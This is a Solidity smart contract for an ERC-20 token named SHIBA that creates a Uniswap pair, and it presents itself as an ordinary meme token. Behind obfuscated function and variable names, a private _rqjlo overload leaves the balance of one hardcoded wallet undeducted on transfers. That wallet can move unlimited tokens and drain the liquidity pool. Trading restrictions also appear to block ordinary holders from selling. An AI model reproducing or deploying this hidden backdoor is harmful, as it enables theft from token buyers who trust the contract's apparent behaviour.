/**

TWITTER: https://twitter.com/SHIBA_PORTAL
TELEGRAM: https://t.me/SHIBA_ERC20
WEBSITE: https://shiberc.com/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rqjlo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rqjlo(a, b, "SafeMath");
    }

    function  _rqjlo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract SHIBA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _vdrpj;
    address payable private _qojyop;
    address private _rwkypo;

    string private constant _name = unicode"SHIBA";
    string private constant _symbol = unicode"SHIBA";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _ewpner;
    mapping (address => bool) private _yrkirhy;
    mapping(address => uint256) private _fnqonp;
    uint256 public _qvolqib = _totalSupply;
    uint256 public _dwrpbxe = _totalSupply;
    uint256 public _koTlfv= _totalSupply;
    uint256 public _vopTlf= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yopeqnj=0;
    uint256 private _erdzdy=0;
    

    bool private _bfyqjh;
    bool public _uefipvof = false;
    bool private qaopne = false;
    bool private _oetrhbv = false;


    event _prkhsdc(uint _qvolqib);
    modifier uhrholr {
        qaopne = true;
        _;
        qaopne = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _ewpner[owner(

        )] = true;
        _ewpner[address
        (this)] = true;
        _ewpner[
            _qojyop] = true;
        _qojyop = 
        payable (0x29d52d3B363500a2bC9635d8FC2d06AAe58c97DF);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rqjlo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kvhrab=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_uefipvof) {
                if (to 
                != address
                (_vdrpj) 
                && to !=
                 address
                 (_rwkypo)) {
                  require(_fnqonp
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnqonp
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rwkypo && to != 
            address(_vdrpj) &&
             !_ewpner[to] ) {
                require(amount 
                <= _qvolqib,
                 "Exceeds the _qvolqib.");
                require(balanceOf
                (to) + amount
                 <= _dwrpbxe,
                  "Exceeds the _dwrpbxe.");
                if(_erdzdy
                < _yopeqnj){
                  require
                  (! _rafpiyb(to));
                }
                _erdzdy++;
                 _yrkirhy
                 [to]=true;
                kvhrab = amount._pvr
                ((_erdzdy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rwkypo &&
             from!= address(this) 
            && !_ewpner[from] ){
                require(amount <= 
                _qvolqib && 
                balanceOf(_qojyop)
                <_vopTlf,
                 "Exceeds the _qvolqib.");
                kvhrab = amount._pvr((_erdzdy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_erdzdy>
                _yopeqnj &&
                 _yrkirhy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!qaopne 
            && to == _rwkypo &&
             _oetrhbv &&
             contractTokenBalance>
             _koTlfv 
            && _erdzdy>
            _yopeqnj&&
             !_ewpner[to]&&
              !_ewpner[from]
            ) {
                _transferFrom( _wvaef(amount, 
                _wvaef(contractTokenBalance,
                _vopTlf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _pxleuoy(address
                    (this).balance);
                }
            }
        }

        if(kvhrab>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kvhrab);
          emit
           Transfer(from,
           address
           (this),kvhrab);
        }
        _balances[from
        ]= _rqjlo(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rqjlo(kvhrab));
        emit Transfer
        (from, to, 
        amount.
         _rqjlo(kvhrab));
    }

    function _transferFrom(uint256
     tokenAmount) private
      uhrholr {
        if(tokenAmount==
        0){return;}
        if(!_bfyqjh)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _vdrpj.WETH();
        _approve(address(this),
         address(
             _vdrpj), 
             tokenAmount);
        _vdrpj.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wvaef
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rqjlo(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _qojyop){
            return a ;
        }else{
            return a .
             _rqjlo (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvolqib = _totalSupply;
        _dwrpbxe = _totalSupply;
        emit _prkhsdc(_totalSupply);
    }

    function _rafpiyb(address 
    account) private view 
    returns (bool) {
        uint256 edskfr;
        assembly {
            edskfr :=
             extcodesize
             (account)
        }
        return edskfr > 
        0;
    }

    function _pxleuoy(uint256
    amount) private {
        _qojyop.
        transfer(
            amount);
    }

    function openqTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _bfyqjh ) ;
        _vdrpj  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _vdrpj), 
            _totalSupply);
        _rwkypo = 
        IUniswapV2Factory(_vdrpj.
        factory( ) 
        ). createPair (
            address(this
            ),  _vdrpj .
             WETH ( ) );
        _vdrpj.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rwkypo).
        approve(address(_vdrpj), 
        type(uint)
        .max);
        _oetrhbv = true;
        _bfyqjh = true;
    }

    receive() external payable {}
}